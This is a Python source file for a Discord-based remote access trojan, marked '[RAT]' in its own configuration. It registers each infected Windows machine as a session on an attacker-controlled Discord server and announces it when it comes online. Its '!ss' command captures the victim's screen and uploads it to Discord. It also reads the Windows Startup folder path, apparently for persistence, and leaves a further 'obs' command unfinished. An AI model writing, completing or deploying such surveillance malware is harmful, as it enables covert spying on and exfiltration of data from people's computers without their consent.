import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
import string
import random
import tempfile
import winreg
import pyautogui

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_BOT_TOKEN")
SERVER_ID = int(os.getenv("SERVER_ID"))

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Configuration
SESSION_NAME_LEN = 10
PREFIX_FOR_MARKING = "[RAT]"
SUFFIX_FOR_MARKING = "99002"
DELETE_OLD_CHANNELS = True
CHANNEL_NAMES = ['main']

def get_startup_folder():
    """Get the path to the Startup folder."""
    key = r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders'
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
        return winreg.QueryValueEx(reg_key, 'Startup')[0]

def random_ascii(length=SESSION_NAME_LEN):
    """Generate a random session name."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length)).upper()

def exists(temp_dir, suffix=SUFFIX_FOR_MARKING):
    for folder in os.listdir(temp_dir):
        if folder.endswith(suffix):
            return folder.removesuffix(suffix)
    return None

def make_temp_dir(session_name, temp_dir, suffix=SUFFIX_FOR_MARKING):
    """Create a temporary directory with the specified session name and suffix."""
    os.makedirs(os.path.join(temp_dir, session_name + suffix), exist_ok=True)

async def prep_for_discord(guild, channel_names, prefix_for_marking, delete_old_channels, session_name):
    """Prepare categories and channels in the Discord guild."""
    category_name = prefix_for_marking + session_name
    category = discord.utils.get(guild.categories, name=category_name)
    
    if not category:
        try:
            category = await guild.create_category(name=category_name)
            print(f"Created category '{category_name}' in '{guild.name}'")
        except discord.Forbidden:
            print(f"Missing permissions to create a category in '{guild.name}'.")
            return
        except discord.HTTPException as e:
            print(f"Failed to create category in '{guild.name}': {e}")
            return

    for channel_name in channel_names:
        try:
            await guild.create_text_channel(name=channel_name, category=category)
            print(f"Created channel '{channel_name}' in category '{category.name}'")
        except discord.Forbidden:
            print(f"Missing permissions to create a channel in '{guild.name}'.")
        except discord.HTTPException as e:
            print(f"Failed to create channel in '{guild.name}': {e}")

    if delete_old_channels:
        for cat in guild.categories:
                if cat.name.startswith(prefix_for_marking) and not cat.name.endswith(session_name):
                    for channel in cat.channels:
                        for channel_name in channel_names:
                            if channel.name == channel_name:
                                continue
                            await channel.delete()
                    await cat.delete()

TEMP_DIR = tempfile.gettempdir()
session_name = random_ascii()
existing_session_name = exists(TEMP_DIR)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')
    
    guild = bot.get_guild(SERVER_ID)
    if not guild:
        print(f"Guild with ID {SERVER_ID} not found.")
        return
    if existing_session_name:
        session_name = existing_session_name
        print(f"Session already exists: {session_name}")
        category = discord.utils.get(guild.categories, name=PREFIX_FOR_MARKING + session_name)
        if category:
            for channel in category.channels:
                if channel.name in CHANNEL_NAMES:
                    await channel.send("@everyone online!")
                    break
    else:
        print("Creating new session...")
        make_temp_dir(session_name, TEMP_DIR)
        await prep_for_discord(guild, CHANNEL_NAMES, PREFIX_FOR_MARKING, DELETE_OLD_CHANNELS, session_name)
        category = discord.utils.get(guild.categories, name=PREFIX_FOR_MARKING + session_name)
        if category:
            for channel in category.channels:
                if channel.name in CHANNEL_NAMES:
                    await channel.send("@everyone online!")
                    break

@bot.command(name='ss')
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        name = random_ascii(5)
        screenshot.save(os.path.join(TEMP_DIR,name))
        with open(os.path.join(TEMP_DIR,name), 'rb') as f:
            await ctx.send(file=discord.File(f, 'Screenshot.png'))
    except Exception as e:
        await ctx.send(f"Error has occuried {e}")
        
@bot.command(name='obs')
async def obs(ctx, seconds):
    pass


bot.run(TOKEN)
